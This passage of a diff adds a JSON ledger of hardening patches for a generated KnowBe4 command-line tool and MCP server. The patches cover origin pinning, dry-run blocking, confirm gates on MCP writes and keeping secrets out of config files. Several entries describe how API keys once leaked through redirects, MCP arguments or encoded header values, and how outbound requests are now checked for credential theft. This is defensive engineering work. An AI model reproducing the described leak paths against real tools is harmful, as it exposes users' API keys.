+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/knowbe4_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/knowbe4_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/knowbe4blackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to domotz from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Domotz whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "inner = dryRunTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/knowbe4blackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/domotz_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Domotz: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/knowbe4_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/knowbe4_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/knowbe4blackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/knowbe4blackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "status": "active",
+   "summary": "config.toml never holds a credential: every value it keeps passes persistedWithoutCredentials (base_url and token_url lose their userinfo and every credential-named or held query value; a credential-named header, or one repeating a configured or environment credential, is left out) and the write is refused when the file still repeats any held value; the legacy scrub writes through the same filter. The 0600 credential store is unchanged.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `DOMOTZ_BASE_URL='https://api-us-east-1-cell-1.domotz.com/public-api/v1?api_key=X' auth set-token` wrote X (and a userinfo password, a held secret under any query name, a token_url query secret) into config.toml, because the generated save persists base_url and token_url as configured. Work order credential rule: nothing but the 0600 credential store holds a credential. Hand file internal/config/domotz_persist.go; three anchored lines in the generated config.go (tools/apply_credential_rules.py). TestConfigFileNeverHoldsACredential failed on the generated save (seen/r1-config-file-credential-seen-failing.log). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "persist = persistedWithoutCredentials(persisted.persisted(), c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := refuseCredentialInConfigFile(persist, data); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "scrubbed := persistedWithoutCredentials(legacy.persisted(), c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "func persistedWithoutCredentials(p persistedConfig, c *Config) persistedConfig {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "func refuseCredentialInConfigFile(persist any, data []byte) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist_test.go",
+     "contains": "func TestSavedConfigFileKeepsNoCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/knowbe4blackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "func urlWithoutCredentials(raw string, creds []string) (string, bool) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its (withholding) output file on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/knowbe4blackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "g304-paths-cleaned-not-annotated",
+   "status": "active",
+   "summary": "The learn journal's append and the delivery history's tail read open filepath.Clean'd paths instead of carrying a #nosec G304 annotation",
+   "why": "The security gate accepts an annotation-hidden gosec finding only when the whole enclosing declaration ships unchanged in 3 other connectors; journal-credential-hardening edits AppendJournalEntry, so the generated annotation lost its precedent (P1 in the gate), and the new SeedFromFile had none. A cleaned path satisfies G304 without an annotation (re-applied by tools/apply_credential_rules.py). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.OpenFile(filepath.Clean(p), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "active",
+   "summary": "The X-API-KEY header and every API request go only to the scheme, host and port of the configured base URL (https://api-us-east-1-cell-1.domotz.com/public-api/v1, or DOMOTZ_BASE_URL); every redirect hop must stay on that origin, a non-ASCII host never matches, and an unparseable base URL pins nothing (every request refused). Installed on every CLI, novel and MCP client by registerClientHook (internal/cli/domotz_guard.go), with the response cache off and --dry-run clients refusing every send",
+   "why": "Credential rule host pinning: the generated client sends the X-API-KEY header to whatever URL it is handed and its CheckRedirect strips only the named auth headers, so a Location to another host or an absolute path from an MCP argument would carry the key off the vendor API. One origin, taken from the configured base URL; an operator who sets DOMOTZ_BASE_URL moves the pin with it. Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "func checkPin(pin string, req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "if o := normalizedOrigin(req.URL); o == \"\" || o != pin {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "hc.Transport = originPinTripper{pin: pin, next: inner}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "u, err := url.Parse(client.ResolvedBaseURL(base, vars))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_cred_rules_test.go",
+     "contains": "func TestPinAllowsOnlyTheAPIOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_cred_rules_test.go",
+     "contains": "func TestPinFollowsTheConfiguredBaseURL(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-persistence-gate-narrower-than-chokepoint",
+   "status": "active",
+   "summary": "config.toml keeps no header whose value repeats one of the configuration's credentials, whole, as any 8-character piece, or base64, base32 or hex encoded, and no write whose fields together repeat one",
+   "why": "Codex r1 P1 credential persisted outside the credential store: the header check used the shared funnel's narrower matcher, which reads no base32, and the last check skipped header values, so `[headers] X-Trace=\"INXW24DSMVZX...\"` (the API key in base32) stayed in config.toml through `auth set-token`. Seen failing: seen/r1-persistence-gate-narrower-than-chokepoint-seen-failing.log. Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/knowbe4_codex_r1_test.go",
+     "contains": "func TestR1ConfigHeaderEncodingOfTheKeyIsNotSaved(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "return credentialName(name) || echoes(value, creds)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "return echoes(string(b), creds)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "func echoes(text string, values []string) bool {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "region-origin-pinned",
+   "status": "active",
+   "summary": "The origin pin is the resolved templated base URL (https://api-{region}.domotz.com/public-api/v1 with DOMOTZ_REGION filled in), and a region that is not one DNS label pins nothing, so every request is refused",
+   "why": "The ported guard pinned url.Parse(c.BaseURL); the unresolved {region} template does not parse, the pin was empty and every request was refused. pinnedOrigin resolves the template first and refuses a region that could change the host (a dot, a slash, an @). Test seen failing first: seen/region-origin-pinned-seen-failing.log in the run dir. (domotz 4.34.2 reprint) Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "func pinnedOrigin(base string, vars map[string]string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "installPin(c.HTTPClient, pinnedOrigin(c.BaseURL, c.CurrentTemplateVars()), c.DryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_region_pin_test.go",
+     "contains": "func TestPinFollowsTheResolvedRegion(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-populates-insights-tables",
+   "status": "active",
+   "summary": "sync walks every synced phishing test's recipients (GET /v1/phishing/security_tests/{pst_id}/recipients) into pst_recipients and takes the risk snapshots, so the recipient- and risk-based novels (repeat-clickers, untrained-clickers, report-rate, risk-drift, qbr, ...) answer from real rows after a sync; a recipient walk where every fetch failed fails the sync, a partial one says the answers are partial",
+   "why": "The published 4.24 tree carried insights.SyncExtras but nothing called it, so after a real sync pst_recipients and risk_snapshots stayed empty and every recipient-based novel answered zero. knowbe4_sync_extras.go wraps the generated sync through the registerNovelCommand hook (regen-durable: no generated file is edited); it skips --dry-run and a --resources list without phishing-tests, users or groups. Test seen failing first: seen/sync-populates-insights-tables-seen-failing.log in the run dir. (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_sync_extras.go",
+     "contains": "registerNovelCommand(func(root *cobra.Command, flags *rootFlags) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_sync_extras.go",
+     "contains": "insights.SyncExtras(cmd.Context(), c, st.DB(), 100)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "func SyncExtras(ctx context.Context, g Getter, db *sql.DB, perPage int) (walk RecipientWalk, snapshots int, err error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "all %d phishing-test recipient fetches failed: %w",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_sync_novels_test.go",
+     "contains": "func TestNovelsReadWhatSyncWrites(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_sync_novels_test.go",
+     "contains": "func TestSyncFailsWhenEveryRecipientFetchFails(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_sync_novels_test.go",
+     "contains": "func TestSyncWalksRecipientsOnlyWhenItsInputsSync(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "user-event-origin-pinned",
+   "status": "active",
+   "summary": "The User Event API client (the events commands, KNOWBE4_USER_EVENT_API_KEY) is pinned to its resolved origin like the Reporting client: a redirect elsewhere is refused before the key leaves, --dry-run sends nothing, KNOWBE4_USER_EVENT_BASE_URL must be an http(s) URL with a host and no user info, query or fragment, and an unresolved ${user_config.*} placeholder in its key, region or base URL reads as unset",
+   "why": "The hand-built second client used a bare http.Client, outside the guard the press installs on the generated client, so a redirect from the events host carried the event key to any host; it also read os.Getenv directly, so an .mcpb install left without the optional event key sent the literal placeholder as a Bearer token. newUserEventsClient installs the same pin; KNOWBE4_USER_EVENT_BASE_URL (added in this reprint) lets offline tests point it at a fake. Test seen failing first: seen/user-event-origin-pinned-seen-failing.log in the run dir. (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_userevents_guard.go",
+     "contains": "func newUserEventsClient(flags *rootFlags) (*userevents.Client, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_userevents_guard.go",
+     "contains": "installPin(c.HTTP, pin, flags.dryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/events.go",
+     "contains": "newUserEventsClient(flags)",
+     "code_only": true,
+     "min_count": 7
+    },
+    {
+     "file": "cli/internal/cli/events.go",
+     "not_contains": "userevents.New(flags.timeout)"
+    },
+    {
+     "file": "cli/internal/userevents/userevents.go",
+     "contains": "key := strings.TrimSpace(cliutil.EnvOverride(EnvKey))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/userevents/userevents.go",
+     "contains": "const BaseURLEnv = \"KNOWBE4_USER_EVENT_BASE_URL\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_userevents_guard_test.go",
+     "contains": "func TestUserEventKeyStaysOnTheEventsHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/userevents/knowbe4_env_test.go",
+     "contains": "func TestEnvPlaceholdersReadAsUnset(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "events-command-registered",
+   "status": "active",
+   "summary": "root.go registers the hand-built events group (User Event API) on the root command",
+   "why": "root.go is generated and the press knows nothing of the User Event API, so a render drops the registration while events.go stays and the events commands vanish from the CLI and the MCP mirror. tools/apply_edits.py re-applies the one line. (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newEventsCmd(flags))",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-default-region-is-real",
+   "status": "active",
+   "summary": "doctorTemplateDefaults is empty: the default region us resolves to the real KnowBe4 Reporting API host (https://us.api.knowbe4.com/v1), so doctor probes it instead of reporting every default install as an unconfigured placeholder",
+   "why": "press-traps s5: the fleet doctor replay filled doctorTemplateDefaults with the default region, so doctor printed \"not configured (base_url is a placeholder)\" and skipped the credential probe on every install using the documented default region. A fleet re-mint of the doctor template restores it: keep this entry. tools/apply_edits.py re-applies it. Test seen failing first: seen/doctor-default-region-real-host-seen-failing.log in the run dir. (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "var doctorTemplateDefaults = map[string]string{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_doctor_region_test.go",
+     "contains": "func TestDoctorDialsTheDocumentedDefaultRegion(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorNoteDefaultRegion(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorNoteDefaultRegion(cfg, doctorBase, report)",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "spec-path-param-examples",
+   "status": "upstreamed",
+   "summary": "spec.yaml gives every positional parameter an example (user_id 667542, group_id 3264, campaign_id 3423, pst_id 16142, ...), so the 4.34.2 render emits a runnable Example on every command with a positional argument",
+   "why": "press-traps s1: 4.34.0+ emits only runnable examples; a command whose path params carry no example gets none, and dogfood's example coverage fails (tools/spec_fix.py). Spec-encoded: survives every reprint from this spec. (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/users_get.go",
+     "contains": "knowbe4-cli users get 667542",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-credential-to-other-api-host",
+   "status": "active",
+   "summary": "Neither KnowBe4 key reaches the other API's host. The credential kit binds each key to its own origin; a value held from two sources (a config file api_key equal to the User Event key) is bound to both, so each client also refuses a request that repeats the other API's effective keys whole, as written or percent-decoded, in the URL, any header or the body",
+   "why": "`KNOWBE4_API_KEY=ReportingSecret-7c92 KNOWBE4_USER_EVENT_API_KEY=EventSecret-8d31 events create ... --description ReportingSecret-7c92` posted the Reporting key to the User Event host: origin pinning checks where a request goes, not what it carries. The check is one shared matcher (cliutil.RequestRepeatsValues over EchoesValues and the outbound part reassembly) on a transport installed on both clients, with each client's foreign keys declared from their sources, never inferred from values. The Reporting set is every credential the configuration sends (key fields, auth header, credential-named configured headers, base URL userinfo password and credential query values): seen/r1-credential-to-other-api-host-whole-set-seen-failing.log. Codex review round 1 (knowbe4 4.34.2 reprint). Seen failing: seen/r1-credential-to-other-api-host-seen-failing.log; passing: seen/r1-credential-to-other-api-host-passing.log (run dir). (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "refuseOtherAPICredentials(c.HTTPClient, otherThan(userEventCredentials(), config.SentReportingCredentials(c.Config)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_userevents_guard.go",
+     "contains": "refuseOtherAPICredentials(c.HTTP, otherThan(config.ReportingCredentials(cfg), userEventCredentials()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "add(cfg.Knowbe4ApiKey, cfg.AccessToken, cfg.RefreshToken, cfg.ClientSecret, cfg.AuthHeaderVal)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_kb4_r1_test.go",
+     "contains": "func TestReportingCredentialsCoverEveryConfiguredSecret(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_kb4_r1_test.go",
+     "contains": "func TestNeitherKeyReachesTheOtherAPIsHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "if repeatsAny(req, body, t.foreign) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "add(urlCredentials(cfg.BaseURL)...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "if credentialName(k) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-persistence-gate-skipped-under-agentcookie",
+   "status": "active",
+   "summary": "With an .agentcookie-managed marker, config.toml's credential fields stay as the external store's declared secrets file expects, and every other field (base_url, headers, TLS settings, template vars) passes the same persistence gate as without the marker: a write that would keep a held value there is refused",
+   "why": "save() wrote the whole configuration without the persistence gate under the agentcookie marker, so KNOWBE4_BASE_URL's userinfo password and credential query value landed in config.toml verbatim. The agentcookie credential-field write itself is the declared secrets file (agentcookie.toml [secrets.file], generated TestAgentcookieMarkerKeepsCredentialsInConfig): recorded as an owner P2 in followups. Codex review round 1 (knowbe4 4.34.2 reprint). Seen failing: seen/r1-persistence-gate-skipped-under-agentcookie-seen-failing.log; passing: seen/r1-persistence-gate-skipped-under-agentcookie-passing.log (run dir). (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "if cfg, managed := persist.(Config); managed {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "p, ok = cfg.persisted(), true",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_kb4_r1_test.go",
+     "contains": "func TestAgentcookieConfigPassesThePersistenceGate(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-missing-input-read-as-zero",
+   "status": "active",
+   "summary": "sync takes the account risk snapshot from the documented GET /v1/account (current_risk_score), and no novel reads an input the local store does not hold as none or 0: every QBR figure without its input is null and named in `unavailable`; repeat-clickers, untrained-clickers, coverage-gaps, report-rate, phish-prone-trend, risk-drift and group-risk-contribution fail with ErrInputNotSynced (an input is held only when its own last sync completed, insights.CollectionSynced; see r2-missing-input-read-as-zero); risk-leaderboard counts and clicker risk figures are null without their input; a risk snapshot without a score is no point on a drift series",
+   "why": "The generated sync never fetches GET /v1/account (its account resource reads /account/risk_score_history, which has no current_risk_score), and QBR read an empty account table as account_risk_score 0: a tenant at 65 got 0 after `sync`. The same class across the novels: after `sync --resources users`, repeat-clickers answered [] and risk-leaderboard gave every user clicked_psts 0 (seen/r1-missing-input-read-as-zero-whole-class-seen-failing.log). Codex review round 1 (knowbe4 4.34.2 reprint). Seen failing: seen/r1-missing-input-read-as-zero-seen-failing.log; passing: seen/r1-missing-input-read-as-zero-passing.log (run dir). (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "name, score, aerr := fetchAccountRisk(ctx, g)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "raw, err := g.Get(ctx, \"/account\", nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if s, ok := accountRiskScore(ctx, db); ok {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if pct, err := trainingCompletionPct(ctx, db); err == nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "var ErrInputNotSynced = errors.New(\"not in the local store\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "WHERE resource_type = ? AND last_attempt_complete = 1`, resource).Scan(&last)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "return nil, notSynced(recipientsInput, recipientsSource)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "row.ClickedPSTs = intPtr(len(clicked[u.Email]))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if err := db.QueryRowContext(ctx, tq, targs...).Scan(&times); err != nil || times < 2 {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/readiness.go",
+     "contains": "return nil, notSynced(recipientsInput, recipientsSource)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_kb4_r1_test.go",
+     "contains": "func TestNoNovelReadsAMissingInputAsNone(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "FROM \"risk_snapshots\" WHERE risk_score IS NOT NULL`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_kb4_r1_test.go",
+     "contains": "func TestQBRReadsTheDocumentedAccountRiskScore(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-incomplete-paging-read-as-complete",
+   "status": "active",
+   "summary": "A phishing test's recipient walk that reaches its page bound with the last page still full is a failed walk for that test (the sync says its answers are partial), never a complete one",
+   "why": "The walk stopped after 1000 pages and reported the test as walked in full, so a recipient past the bound, with a documented clicked_at, never reached repeat-clickers. Codex review round 1 (knowbe4 4.34.2 reprint). Seen failing: seen/r1-incomplete-paging-read-as-complete-seen-failing.log; passing: seen/r1-incomplete-paging-read-as-complete-passing.log (run dir). (knowbe4 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "if page > maxRecipientPages {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "for page := 1; ; page++ {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "not_contains": "page <= 1000"
+    },
+    {
